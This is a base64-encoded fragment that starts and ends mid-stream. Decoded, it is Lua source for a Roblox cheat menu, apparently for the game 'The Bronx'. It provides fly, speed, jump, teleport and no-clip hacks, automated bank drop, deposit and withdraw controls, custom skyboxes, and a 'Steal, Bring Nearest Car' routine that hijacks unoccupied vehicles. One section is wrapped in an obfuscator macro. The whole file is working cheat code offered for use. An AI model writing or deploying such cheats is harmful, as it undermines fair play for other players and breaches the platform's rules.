UgPSAidG9nZ2xlIiwgbmFtZSA9ICJDYXIgRmx5IiwgZmxhZyA9ICJjYXJmbHkiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254LmNhcmZseSA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KSAKCiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJNb2RzU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJNb2RpZnkgV2Fsa1NwZWVkIiwgZmxhZyA9ICJNb2RpZnlXYWxrU3BlZWRfVGhlQnJvbngiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLk1pc2NTZXR0aW5ncy5Nb2RpZnlTcGVlZC5FbmFibGVkID0gc3RhdGUKICAgICAgICAgICAgICAgIGVuZH0pICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJNb2RzU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJNb2RpZnkgSnVtcFBvd2VyIiwgZmxhZyA9ICJNb2RpZnlKdW1wUG93ZXJfVGhlQnJvbngiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLk1pc2NTZXR0aW5ncy5Nb2RpZnlKdW1wLkVuYWJsZWQgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJNb2RzU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJDbGljayBUZWxlcG9ydCIsIGZsYWcgPSAiQ2xpY2tUZWxlcG9ydF9UaGVCcm9ueCIsIGRlZmF1bHQgPSBmYWxzZX0pCgogICAgICAgICAgICAgICAgbG9jYWwgX05vQ2xpcFRvZ2dsZSA9IENoYXJhY3Rlck1vZHNTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gIk5vIENsaXAiLCBmbGFnID0gIk5vQ2xpcF9UaGVCcm9ueCIsIHNlcGVyYXRvciA9IHRydWUsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJ1blNlcnZpY2U6QmluZFRvUmVuZGVyU3RlcCgiTk9DTElQIiwgMSwgTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5IZWFsdGggfj0gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbGxpZGVfRGF0YVtWYWx1ZS5OYW1lXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWYWx1ZS5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIExvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBDb2xsaWRlX0RhdGFbVmFsdWUuTmFtZV0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmFsdWUuQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIFJ1blNlcnZpY2U6VW5iaW5kRnJvbVJlbmRlclN0ZXAoIk5PQ0xJUCIpCgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIExvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBDb2xsaWRlX0RhdGFbVmFsdWUuTmFtZV0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmFsdWUuQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIENoYXJhY3Rlck1vZHNTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJDYXIgRmx5IFNwZWVkIiwgZmxhZyA9ICJjYXJmbHlzcGVlZCIsIG1pbiA9IDUwLCBtYXggPSAzMDAsIGRlZmF1bHQgPSA1MCwgc3VmZml4ID0gIiUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5jYXJmbHlzcGVlZCA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KSAgICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJNb2RzU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiV2Fsa1NwZWVkIFZhbHVlIiwgZmxhZyA9ICJXYWxrU3BlZWRWYWx1ZV9UaGVCcm9ueCIsIG1pbiA9IDAsIG1heCA9IDI1MCwgZGVmYXVsdCA9IDUwLCBzdWZmaXggPSAiJSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLk1pc2NTZXR0aW5ncy5Nb2RpZnlTcGVlZC5WYWx1ZSA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLVtbQ2hhcmFjdGVyTW9kc1NlY3Rpb246c2xpZGVyKHtuYW1lID0gIkZseSBTcGVlZCIsIGZsYWcgPSAiaW52aXNmbHlzcGVlZCIsIG1pbiA9IDUsIG1heCA9IDUwLCBkZWZhdWx0ID0gMTAsIHN1ZmZpeCA9ICIlIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbnguaW52aXNmbHlzcGVlZCA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KV1dICAgICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJNb2RzU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiSnVtcFBvd2VyIFZhbHVlIiwgZmxhZyA9ICJKdW1wUG93ZXJWYWx1ZV9UaGVCcm9ueCIsIG1pbiA9IDAsIG1heCA9IDI1MCwgZGVmYXVsdCA9IDcsIHN1ZmZpeCA9ICIlIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuTWlzY1NldHRpbmdzLk1vZGlmeUp1bXAuVmFsdWUgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJNb2RzU2VjdGlvbjprZXliaW5kKHtuYW1lID0gIkNsaWNrIFRlbGVwb3J0IEtleSIsIGZsYWcgPSAiQ2xpY2tUZWxlcG9ydEtleV9UaGVCcm9ueCIsIGtleSA9IEVudW0uS2V5Q29kZS5MZWZ0Q29udHJvbCwgbW9kZSA9ICJIb2xkIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbnguQ2xpY2tUZWxlcG9ydEFjdGl2ZSA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQogICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgbG9jYWwgRXh0cmFUYWJDb2x1bW4gPSBFeHRyYVRhYjpjb2x1bW4oe30pCgogICAgICAgICAgICAgICAgbG9jYWwgQmFua1NlY3Rpb24gPSBFeHRyYVRhYkNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIkJhbmsgU2VjdGlvbiIsIHNpZGUgPSAicmlnaHQiLCBzaXplID0gMC41NTAsIGljb24gPSBHZXRJbWFnZSgiU2V0dGluZ3MucG5nIil9KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBCYW5rU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJBdXRvIERyb3AiLCBmbGFnID0gIkF1dG9Ecm9wIiwgZGVmYXVsdCA9IGZhbHNlLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5BdXRvRHJvcCA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KSAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICBCYW5rU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJBdXRvIERlcG9zaXQiLCBmbGFnID0gImRlcG9zIiwgZGVmYXVsdCA9IGZhbHNlLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5kZXBvcyA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgQmFua1NlY3Rpb246dG9nZ2xlKHt0eXBlID0gInRvZ2dsZSIsIG5hbWUgPSAiQXV0byBXaXRoZHJhdyIsIGZsYWcgPSAiZHJhd3ciLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254LmRyYXd3ID0gc3RhdGUKICAgICAgICAgICAgICAgIGVuZH0pICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIEJhbmtTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJBdXRvIERyb3AgQW1vdW50IiwgZmxhZyA9ICJNb25leUFtb3VudCIsIG1pbiA9IDEwMCwgbWF4ID0gMTAwMDAsIGRlZmF1bHQgPSAxMDAwMCwgc3VmZml4ID0gIiQiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5Nb25leUFtb3VudCA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBCYW5rU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiQXV0byBEZXBvc2l0IEFtb3VudCIsIGZsYWcgPSAiRGVwb3NpdEFtb3VudCIsIG1pbiA9IDEsIG1heCA9IDMwMDAwLCBkZWZhdWx0ID0gMzAwMDAsIHN1ZmZpeCA9ICIkIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbnguRGVwb3NpdEFtb3VudCA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBCYW5rU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiQXV0byBXaXRoZHJhdyBBbW91bnQiLCBmbGFnID0gIldpdGhkcmF3QW1vdW50IiwgbWluID0gMSwgbWF4ID0gOTAwMDAsIGRlZmF1bHQgPSA5MDAwMCwgc3VmZml4ID0gIiQiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5XaXRoZHJhd0Ftb3VudCA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIGxvY2FsIFNreXNlY3Rpb24gPSBFeHRyYVRhYkNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIkN1c3RvbSBTa3lib3hlcyIsIHNpZGUgPSAicmlnaHQiLCBzaXplID0gMC40NTAsIGljb24gPSBHZXRJbWFnZSgiU2V0dGluZ3MucG5nIil9KQoKbG9jYWwgZnVuY3Rpb24gc2V0U2t5KHNreUlkcykKICAgIGxvY2FsIEwgPSBnYW1lOkdldFNlcnZpY2UoIkxpZ2h0aW5nIikKICAgIAogICAgTC5DbG9ja1RpbWUgPSA5CgogICAgbG9jYWwgb2xkID0gTDpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlNreSIpCiAgICBpZiBvbGQgdGhlbiBvbGQ6RGVzdHJveSgpIGVuZAoKICAgIGxvY2FsIFMgPSBJbnN0YW5jZS5uZXcoIlNreSIpCiAgICBTLlNreWJveEJrID0gc2t5SWRzLkJrCiAgICBTLlNreWJveERuID0gc2t5SWRzLkRuCiAgICBTLlNreWJveEZ0ID0gc2t5SWRzLkZ0CiAgICBTLlNreWJveExmID0gc2t5SWRzLkxmCiAgICBTLlNreWJveFJ0ID0gc2t5SWRzLlJ0CiAgICBTLlNreWJveFVwID0gc2t5SWRzLlVwCiAgICBTLlBhcmVudCA9IEwKCiAgICBTOkNsb25lKCkuUGFyZW50ID0gTAplbmQKCgotLSBSZWFsaXN0aWMgRGF5IFRpbWUKU2t5c2VjdGlvbjpidXR0b24oe25hbWUgPSAiRGF5IFRpbWUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgIHNldFNreSh7CiAgICAgICAgQmsgPSAicmJ4YXNzZXRpZDovLzc0MjU4NTQ0NTY0MzIxIiwKICAgICAgICBEbiA9ICJyYnhhc3NldGlkOi8vNzU0MTgwOTI1NDgxNDMiLAogICAgICAgIEZ0ID0gInJieGFzc2V0aWQ6Ly8xMTQ1NDczNTYzMjQyMTgiLAogICAgICAgIExmID0gInJieGFzc2V0aWQ6Ly85MTEzODc3Mzk3NDg5MCIsCiAgICAgICAgUnQgPSAicmJ4YXNzZXRpZDovLzExMTc0OTM5OTk0NjgzMiIsCiAgICAgICAgVXAgPSAicmJ4YXNzZXRpZDovLzk2OTMzMDQzODEyMTM4IgogICAgfSkKZW5kfSkKCi0tIFJlYWxpc3RpYyBOaWdodCBUaW1lClNreXNlY3Rpb246YnV0dG9uKHtuYW1lID0gIk5pZ2h0IFRpbWUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgIHNldFNreSh7CiAgICAgICAgQmsgPSAicmJ4YXNzZXRpZDovLzE1NTYyNDcyMiIsCiAgICAgICAgRG4gPSAicmJ4YXNzZXRpZDovLzE1NTYyNDcyNyIsCiAgICAgICAgRnQgPSAicmJ4YXNzZXRpZDovLzE1NTYyNDczMCIsCiAgICAgICAgTGYgPSAicmJ4YXNzZXRpZDovLzE1NTYyNDczNiIsCiAgICAgICAgUnQgPSAicmJ4YXNzZXRpZDovLzE1NTYyNDc0MiIsCiAgICAgICAgVXAgPSAicmJ4YXNzZXRpZDovLzE1NTYyNDc0OSIKICAgIH0pCmVuZH0pCgotLSBQaW5rIApTa3lzZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJQaW5rIENsb3VkcyIsIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgc2V0U2t5KHsKICAgICAgICBCayA9ICJyYnhhc3NldGlkOi8vMTE1NTUwMTcwMzQiLAogICAgICAgIERuID0gInJieGFzc2V0aWQ6Ly8xMTU1NTAxMzQxNSIsCiAgICAgICAgRnQgPSAicmJ4YXNzZXRpZDovLzExNTU1MDEwMTQ1IiwKICAgICAgICBMZiA9ICJyYnhhc3NldGlkOi8vMTE1NTUwMDY1NDUiLAogICAgICAgIFJ0ID0gInJieGFzc2V0aWQ6Ly8xMTU1NTAwMDcxMiIsCiAgICAgICAgVXAgPSAicmJ4YXNzZXRpZDovLzExNTU0OTk2MjQ3IgogICAgfSkKZW5kfSkKCi0tIGFpIHNreQpTa3lzZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJQdXJwbGUgR2FsYXh5IiwgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICBzZXRTa3koewogICAgICAgIEJrID0gInJieGFzc2V0aWQ6Ly8xNTk0NTQyOTkiLAogICAgICAgIERuID0gInJieGFzc2V0aWQ6Ly8xNTk0NTQyOTYiLAogICAgICAgIEZ0ID0gInJieGFzc2V0aWQ6Ly8xNTk0NTQyOTMiLAogICAgICAgIExmID0gInJieGFzc2V0aWQ6Ly8xNTk0NTQyODYiLAogICAgICAgIFJ0ID0gInJieGFzc2V0aWQ6Ly8xNTk0NTQzMDAiLAogICAgICAgIFVwID0gInJieGFzc2V0aWQ6Ly8xNTk0NTQyODgiCiAgICB9KQplbmR9KQoKLS0gU3Vuc2V0ClNreXNlY3Rpb246YnV0dG9uKHtuYW1lID0gIlN1bnNldCIsIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgc2V0U2t5KHsKICAgICAgICBCayA9ICJyYnhhc3NldGlkOi8vMTU1MDI1MjUxOTUiLAogICAgICAgIERuID0gInJieGFzc2V0aWQ6Ly8xNTUwMjUyMjc5NyIsCiAgICAgICAgRnQgPSAicmJ4YXNzZXRpZDovLzE1NTAyNTI0NTIwIiwKICAgICAgICBMZiA9ICJyYnhhc3NldGlkOi8vMTU1MDI1MjIxMjkiLAogICAgICAgIFJ0ID0gInJieGFzc2V0aWQ6Ly8xNTUwMjUyMzcxMSIsCiAgICAgICAgVXAgPSAicmJ4YXNzZXRpZDovLzE1NTAyNTI2MTAyIgogICAgfSkKZW5kfSkKCiAgICAgICAtLVtbIEJrID0gInJieGFzc2V0aWQ6Ly8xNTQ3MDEyOTE4MiIsCiAgICAgICAgRG4gPSAicmJ4YXNzZXRpZDovLzE1NDcwMTMwMjg3IiwKICAgICAgICBGdCA9ICJyYnhhc3NldGlkOi8vMTU0NzAxMzIwMTgiLAogICAgICAgIExmID0gInJieGFzc2V0aWQ6Ly8xNTQ3MDEzMzk4MCIsCiAgICAgICAgUnQgPSAicmJ4YXNzZXRpZDovLzE1NDcwMTM2MzcwIiwKICAgICAgICBVcCA9ICJyYnhhc3NldGlkOi8vMTU0NzAxMzkxODEiXV0KCi0tIHN1bW1lciBwcm8KU2t5c2VjdGlvbjpidXR0b24oe25hbWUgPSAiQ2xvdWR5IFN1bW1lciIsIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgc2V0U2t5KHsKICAgICAgICBCayA9ICJyYnhhc3NldGlkOi8vMTc4MzgxMjcyODkiLAogICAgICAgIERuID0gInJieGFzc2V0aWQ6Ly8xNzgzODEyOTYwOSIsCiAgICAgICAgRnQgPSAicmJ4YXNzZXRpZDovLzE3ODM4MTQ0NDIyIiwKICAgICAgICBMZiA9ICJyYnhhc3NldGlkOi8vMTc4MzgxMzE0ODQiLAogICAgICAgIFJ0ID0gInJieGFzc2V0aWQ6Ly8xNzgzODE0ODgyMiIsCiAgICAgICAgVXAgPSAicmJ4YXNzZXRpZDovLzE3ODM4MTQwNzA5IgogICAgfSkKZW5kfSkKCiAgICAgICAgICAgICAgICBFeHRyYVRhYkNvbHVtbiA9IEV4dHJhVGFiOmNvbHVtbih7fSkKICAgICAgICAgICAgICAgIGxvY2FsIEV4dHJhU2VjdGlvbiA9IEV4dHJhVGFiQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiRXh0cmEgU2V0dGluZ3MiLCBzaWRlID0gImxlZnQiLCBzaXplID0gMS4wMTM1fSkgICAKCi0tW1tFeHRyYVNlY3Rpb246YnV0dG9uKHsKICAgIG5hbWUgPSAiU3RlYWwsIEJyaW5nIE5lYXJlc3QgQ2FyIiwKICAgIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGhycCA9IGNoYXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBsb2NhbCBodW0gPSBjaGFyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkh1bWFub2lkIikKCiAgICAgICAgbG9jYWwgbmVhcmVzdENhcgogICAgICAgIGxvY2FsIG5lYXJlc3REaXN0ID0gbWF0aC5odWdlCgogICAgICAgIGZvciBfLCBvYmogaW4gaXBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBvYmo6SXNBKCJNb2RlbCIpIGFuZCBvYmo6RmluZEZpcnN0Q2hpbGQoIkRyaXZlU2VhdCIpIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHNlYXQgPSBvYmo6RmluZEZpcnN0Q2hpbGQoIkRyaXZlU2VhdCIpCiAgICAgICAgICAgICAgICBpZiBzZWF0IGFuZCBub3Qgc2VhdC5PY2N1cGFudCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcHJpbWFyeSA9IG9iai5QcmltYXJ5UGFydCBvciBzZWF0CiAgICAgICAgICAgICAgICAgICAgaWYgcHJpbWFyeSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAocHJpbWFyeS5Qb3NpdGlvbiAtIGhycC5Qb3NpdGlvbikuTWFnbml0dWRlCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRpc3QgPCBuZWFyZXN0RGlzdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZWFyZXN0RGlzdCA9IGRpc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5lYXJlc3RDYXIgPSBvYmoKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGlmIG5vdCBuZWFyZXN0Q2FyIHRoZW4KICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgICAgIGluZm8gPSAiTm8gRW1wdHkgQ2FyIEZvdW5kIE5lYXIgWW91ISIsCiAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIHNlYXQgPSBuZWFyZXN0Q2FyOkZpbmRGaXJzdENoaWxkKCJEcml2ZVNlYXQiKQogICAgICAgIGlmIG5vdCBzZWF0IHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBodW0uU2l0ID0gZmFsc2UKICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIGh1bTpNb3ZlVG8oc2VhdC5Qb3NpdGlvbiArIFZlY3RvcjMubmV3KDAsIDIsIDApKQogICAgICAgIHRhc2sud2FpdCgwLjE1KQogICAgICAgIHNlYXQ6U2l0KGh1bSkKCiAgICAgICAgbG9jYWwgcHJpbWFyeSA9IG5lYXJlc3RDYXIuUHJpbWFyeVBhcnQgb3Igc2VhdAogICAgICAgIGxvY2FsIFR3ZWVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIikKICAgICAgICBsb2NhbCB0d2VlbkluZm8gPSBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIpCiAgICAgICAgbG9jYWwgZ29hbCA9IHtDRnJhbWUgPSBocnAuQ0ZyYW1lICsgVmVjdG9yMy5uZXcoMCw1LDApfQogICAgICAgIGxvY2FsIHR3ZWVuID0gVHdlZW5TZXJ2aWNlOkNyZWF0ZShwcmltYXJ5LCB0d2VlbkluZm8sIGdvYWwpCiAgICAgICAgdHdlZW46UGxheSgpCgogICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgaW5mbyA9ICJTdWNjZXNzZnVsbHkgU3RvbGUgQ2FyISIsCiAgICAgICAgICAgIGxpZmV0aW1lID0gNQogICAgICAgIH0pCiAgICBlbmQKfSkKU3RlYWwgQ2FyIGVubmRdXQoKLS0gYnJpbmcgY2FyICh3b3JraW5nKQpsb2NhbCBmdW5jdGlvbiBHZXROZWFyZXN0Q2FyKGhycCkKICAgIGxvY2FsIENpdkNhcnMgPSB3b3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIkNpdkNhcnMiKQogICAgaWYgbm90IENpdkNhcnMgdGhlbiByZXR1cm4gbmlsIGVuZAoKICAgIGxvY2FsIG5lYXJlc3RDYXIgPSBuaWwKICAgIGxvY2FsIG5lYXJlc3REaXN0ID0gbWF0aC5odWdlCgogICAgZm9yIF8sIGNhciBpbiBpcGFpcnMoQ2l2Q2FyczpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIG5vdCBjYXI6SXNBKCJNb2RlbCIpIHRoZW4gY29udGludWUgZW5kCgogICAgICAgIGxvY2FsIHNlYXQgPSBjYXI6RmluZEZpcnN0Q2hpbGQoIkRyaXZlU2VhdCIpCiAgICAgICAgaWYgbm90IHNlYXQgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgaWYgc2VhdC5PY2N1cGFudCB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICBpZiBub3QgY2FyLlByaW1hcnlQYXJ0IHRoZW4KICAgICAgICAgICAgbG9jYWwgYm9keSA9IGNhcjpGaW5kRmlyc3RDaGlsZCgiQm9keSIpCiAgICAgICAgICAgIGlmIGJvZHkgYW5kIGJvZHk6RmluZEZpcnN0Q2hpbGQoIiNXZWlnaHQiKSB0aGVuCiAgICAgICAgICAgICAgICBjYXIuUHJpbWFyeVBhcnQgPSBib2R5WyIjV2VpZ2h0Il0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgY2FyLlByaW1hcnlQYXJ0ID0gc2VhdAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgaWYgbm90IGNhci5QcmltYXJ5UGFydCB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICBsb2NhbCBkaXN0ID0gKGNhci5QcmltYXJ5UGFydC5Qb3NpdGlvbiAtIGhycC5Qb3NpdGlvbikuTWFnbml0dWRlCiAgICAgICAgaWYgZGlzdCA8IG5lYXJlc3REaXN0IHRoZW4KICAgICAgICAgICAgbmVhcmVzdERpc3QgPSBkaXN0CiAgICAgICAgICAgIG5lYXJlc3RDYXIgPSBjYXIKICAgICAgICBlbmQKICAgIGVuZAoKICAgIHJldHVybiBuZWFyZXN0Q2FyCmVuZAoKCkV4dHJhU2VjdGlvbjpidXR0b24oewogICAgbmFtZSA9ICJTdGVhbCwgQnJpbmcgTmVhcmVzdCBDYXIiLAogICAgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCiAgICAgICAgbG9jYWwgUGxheWVyID0gUGxheWVy